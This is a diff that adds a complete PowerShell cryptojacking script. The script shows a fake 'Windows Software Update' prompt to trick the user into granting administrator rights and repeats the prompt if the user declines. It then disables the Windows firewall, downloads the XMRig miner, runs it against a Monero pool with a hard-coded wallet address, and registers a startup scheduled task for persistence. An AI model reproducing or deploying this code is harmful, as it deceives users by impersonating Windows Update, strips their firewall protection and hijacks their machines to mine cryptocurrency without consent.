@@ -1,0 +1,113 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName PresentationFramework
+$ScriptPath = $MyInvocation.MyCommand.Path
+$ScriptDir  = Split-Path -Parent $ScriptPath
+$PSCommandPath = $ScriptDir + "\CryptoJack1.ps1"
+# Get the ID and security principal of the current user account
+$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent();
+$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID);
+
+# Get the security principal for the administrator role
+$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator;
+
+function promptAdminRights
+{   Add-Type -AssemblyName System.Windows.Forms
+    $global:balmsg = New-Object System.Windows.Forms.NotifyIcon
+    $path = (Get-Process -id $pid).Path
+    $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
+    $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
+    $balmsg.BalloonTipText = "New Windows update available `r`n Click Here to View"
+    $balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
+    $balmsg.Visible = $true
+    $balmsg.ShowBalloonTip(0)
+    $balmsg.dispose()
+    $msgBoxInput =  [System.Windows.MessageBox]::Show("Windows would like to update your system. `r`n Please give Powershell permission to update.",'Windows Software Update','YesNoCancel','Warning')
+    switch  ($msgBoxInput) 
+    {
+
+        'Yes' 
+        {
+            
+            
+          Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;              
+
+
+        }
+        'No'
+        {
+            promptAdminRights
+        }
+        'Cancel'
+        {
+            promptAdminRights
+        }
+    }
+}
+
+function runScript 
+{
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+    Write-Host Preparing Download ...    
+    $download = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
+    
+    $outputPath = $ScriptDir + "\test.zip"
+    $destinationPath = $ScriptDir
+    $FilePath = $ScriptDir + "\WinUpdateTask.bat"
+
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($download, $outputPath)
+    
+    Set-Location $destinationPath 
+
+    if(!(Test-Path $outputPath))
+    {
+        runScript
+    }
+    else
+    {
+        Write-Host "Files Downloaded :D ..."
+        Clear-Host
+
+        # Extract the xmrig zip
+        Expand-Archive -LiteralPath $outputPath -DestinationPath $destinationPath -Force
+
+        # Remove the zip after extraction
+        Remove-Item -Path $outputPath
+
+        # Path to the xmrig executable inside extracted folder
+        $xmrigPath = Join-Path $destinationPath "xmrig-6.24.0\xmrig.exe"
+
+        Write-Host "Starting mining process..."
+
+        # Run xmrig mining process with pool, wallet address, and password 'x'
+        # Replace wallet address below with your own Monero wallet
+        # Define the log file path
+        $logPath = Join-Path $destinationPath "miner.log"
+
+        # Start XMRig with output and error logging
+        Start-Process -FilePath $xmrigPath `
+            -ArgumentList "-o xmrpool.eu:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x" `
+            -RedirectStandardOutput $logPath `
+            -RedirectStandardError $logPath `
+            -NoNewWindow
+
+        # Keep scheduled task as before to run on startup
+        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
+        $action = New-ScheduledTaskAction Start-Process powershell $FilePath
+        Register-ScheduledTask -AsJob -Trigger $trigger -Action $action -TaskName CryptoJack -Force
+        Start-ScheduledTask -TaskName CryptoJack
+
+        Write-Host "Mining started!"
+    }
+}
+
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{  
+    promptAdminRights
+}else
+{
+    runScript 
+} 
+
